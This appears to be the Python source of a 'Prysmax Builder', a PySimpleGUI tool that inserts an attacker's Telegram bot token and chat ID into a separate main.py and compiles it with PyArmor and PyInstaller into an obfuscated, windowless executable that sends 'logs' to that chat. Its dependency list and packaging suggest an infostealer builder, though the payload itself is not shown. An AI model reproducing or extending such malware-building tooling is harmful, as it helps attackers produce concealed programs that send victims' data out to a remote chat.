# 2024!!

import os
import subprocess
import re
import shutil
import fileinput
import PySimpleGUI as sg

def modificar_archivo(file_path, token, chat_id):
    prysmax_pattern = re.compile(r'prysmax\s*=\s*"[^"]*"')
    chat_id_pattern = re.compile(r'chat_id\s*=\s*"[^"]*"')

    with fileinput.FileInput(file_path, inplace=True, backup='', encoding='utf-8') as file:
        for line in file:
            print(prysmax_pattern.sub(f'prysmax = "{token}"', line), end='')

    with fileinput.FileInput(file_path, inplace=True, backup='', encoding='utf-8') as file:
        for line in file:
            print(chat_id_pattern.sub(f'chat_id = "{chat_id}"', line), end='')

def download_libraries():
    required_libraries = [
        'requests', 'json', 'base64', 'sqlite3', 'shutil', 'uuid', 'wmi', 'psutil',
        'subprocess', 'pyarmor==7.6.1', 'pyinstaller', 'glob', 're', 'platform', 'Pillow', 'zipfile', 'python-telegram-bot',
        'pycryptodomex', 'pycryptodome','datetime', "pywin32", "pycrypto"
    ]

    for library in required_libraries:
        try:
            __import__(library)
        except ImportError:
            print(f"{library} not found. Downloading...")
            subprocess.check_call(['pip', 'install', library])

def compile_and_explore(token, id_chat):
    if not os.path.exists("prysmax1builder"):
        os.makedirs("prysmax1builder")

    main_content = ""
    with open("main.py", 'r', encoding='utf-8') as main_file:
        main_content = main_file.read()

    file_path = os.path.join("prysmax1builder", "main.py")
    with open(file_path, 'w', encoding='utf-8') as new_main_file:
        new_main_file.write(main_content)

    modificar_archivo(file_path, token, id_chat)

    here = sg.popup_yes_no("Are you sure you want to compile your file to Executable?", title='Confirm Compilation', button_color=('white', 'purple'))
    if here == 'Yes':
        print("Compiling...")
        try:
            subprocess.run('pyarmor pack -e "--onefile --noconsole --icon=NONE" prysmax1builder\\main.py', shell=True)
        except:
            subprocess.run('pyarmor-7 pack -e"--onefile --noconsole --icon=NONE" prysmax1builder\\main.py', shell=True)

        print("File successfully compiled!")
        subprocess.run("explorer prysmax1builder\\dist", shell=True)
    else:
        print("Compilation canceled.")

def main():
    sg.theme('DarkGrey1')
    sg.set_options(font=('Arial', 12))

    layout = [
        [sg.Text('Prysmax Builder', font=('Arial', 24), text_color='white', justification='right')],
        [sg.Text('Enter the token of @botfather in telegram (Your bot lol):', text_color='white'), sg.InputText(key='token')],
        [sg.Text('Enter the ID of the chat where the logs will arrive:', text_color='white'), sg.InputText(key='id_chat')],
        [sg.Button('Download Libraries', button_color=('white', 'green')), sg.Button('Compile and Explore', button_color=('black', 'white')), sg.Button('Exit', button_color=('white', 'red'))],
    ]

    window = sg.Window('Prysmax Builder', layout, alpha_channel=0.7, grab_anywhere=True)

    while True:
        event, values = window.read()

        if event == sg.WINDOW_CLOSED or event == 'Exit':
            break
        elif event == 'Download Libraries':
            download_libraries()
            sg.popup("Libraries downloaded successfully!", text_color='white')
        elif event == 'Compile and Explore':
            token = values['token']
            id_chat = values['id_chat']
            compile_and_explore(token, id_chat)

    window.close()

if __name__ == '__main__':
    main()
